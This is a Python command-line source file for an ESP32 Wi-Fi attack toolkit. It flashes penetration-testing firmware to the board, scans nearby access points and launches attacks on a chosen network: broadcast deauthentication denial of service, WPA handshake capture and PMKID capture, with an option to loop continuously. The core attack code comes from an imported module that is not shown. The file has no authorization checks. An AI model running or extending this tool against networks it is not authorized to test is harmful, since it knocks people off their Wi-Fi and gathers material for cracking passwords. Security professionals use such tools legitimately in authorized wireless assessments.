import click
import esptool
import os
from .deauth import ESP32WiFiAttackTool

def print_banner():
   
    click.secho("A cross-platform Python toolkit for Wi-Fi deauthentication testing.", fg="yellow")
    click.secho("https://github.com/ishanoshada/esp32-deauth\n", fg="blue")

@click.group()
def cli():
    print_banner()

@cli.command()
@click.option('--port', default='COM3', help='Serial port for ESP32 (e.g., COM3 or /dev/ttyUSB0)')
@click.option('--baud', default=115200, help='Baud rate for erasing')
def erase(port, baud):
    """Erase the ESP32 flash memory."""
    click.secho(f"Erasing ESP32 flash on port {port} at {baud} baud...", fg="magenta")
    try:
        esptool.main([
            '--port', port,
            '--baud', str(baud),
            'erase_flash'
        ])
        click.secho("✅ ESP32 flash memory erased successfully.", fg="green", bold=True)
    except Exception as e:
        click.secho(f"❌ Error erasing flash: {e}", fg="red", bold=True)

@cli.command()
@click.option('--port', default='COM3', help='Serial port for ESP32 (e.g., COM3 or /dev/ttyUSB0)')
@click.option('--baud', default=115200, help='Baud rate for flashing')
def flash(port, baud):
    """Flash ESP32 with deauthentication firmware."""
    firmware_dir = os.path.join(os.path.dirname(__file__), 'firmware')
    files = {
        'bootloader': os.path.join(firmware_dir, 'bootloader.bin'),
        'partition': os.path.join(firmware_dir, 'partition-table.bin'),
        'app': os.path.join(firmware_dir, 'esp32-wifi-penetration-tool.bin')
    }
    for name, path in files.items():
        if not os.path.exists(path):
            click.secho(f"❌ {name.capitalize()} file not found at: {path}", fg="red")
            return
    click.secho(f"Flashing ESP32 on port {port} at {baud} baud...", fg="magenta")
    try:
        esptool.main([
            '--port', port,
            '--baud', str(baud),
            '--after', 'hard_reset',
            'write_flash',
            '--flash_mode', 'dio',
            '--flash_freq', '40m',
            '--flash_size', 'detect',
            '0x1000', files['bootloader'],
            '0x8000', files['partition'],
            '0x10000', files['app']
        ])
        click.secho("✅ Firmware flashed successfully.", fg="green", bold=True)
    except Exception as e:
        click.secho(f"❌ Error flashing firmware: {e}", fg="red", bold=True)

@cli.command()
def run():
    """Run the interactive Wi-Fi attack tool."""
    click.secho("Starting ESP32 Wi-Fi Attack Tool...", fg="cyan", bold=True)
    click.secho("Ensure you are connected to the ManagementAP WiFi network.\n", fg="yellow")
    tool = ESP32WiFiAttackTool()
    tool.run()

@cli.command()
def scan():
    """Scan for Wi-Fi networks."""
    click.secho("Scanning for Wi-Fi networks...\n", fg="cyan")
    tool = ESP32WiFiAttackTool()
    aps = tool.get_ap_list()
    tool.display_aps(aps)

@cli.command()
@click.option('--ap-id', type=int, required=True, help='AP ID to attack')
@click.option('--attack-type', type=click.Choice(['PASSIVE', 'HANDSHAKE', 'PMKID', 'DOS']), default='DOS', help='Attack type')
@click.option('--attack-method', type=str, default='DEAUTH_BROADCAST', help='Attack method (e.g., DEAUTH_BROADCAST)')
@click.option('--timeout', type=int, default=225, help='Attack timeout in seconds')
@click.option('--continuous', is_flag=True, help='Run attack in continuous loop')
def attack(ap_id, attack_type, attack_method, timeout, continuous):
    """Run a targeted deauthentication attack."""
    click.secho(f"Preparing attack on AP ID {ap_id}...", fg="magenta")
    tool = ESP32WiFiAttackTool()
    if not tool.check_api_connectivity():
        click.secho("Server disconnected. Attempting to reconnect to ManagementAP...", fg="yellow")
        if not tool.reconnect_wifi():
            click.secho("Failed to reconnect to ManagementAP.", fg="red", bold=True)
            return
    aps = tool.get_ap_list()
    ap = next((ap for ap in aps if ap['id'] == ap_id), None)
    if not ap:
        click.secho("Invalid AP ID.", fg="red", bold=True)
        return
    tool.attack_network(ap, tool.attack_types[attack_type], attack_method, timeout, continuous)

if __name__ == '__main__':
    cli()
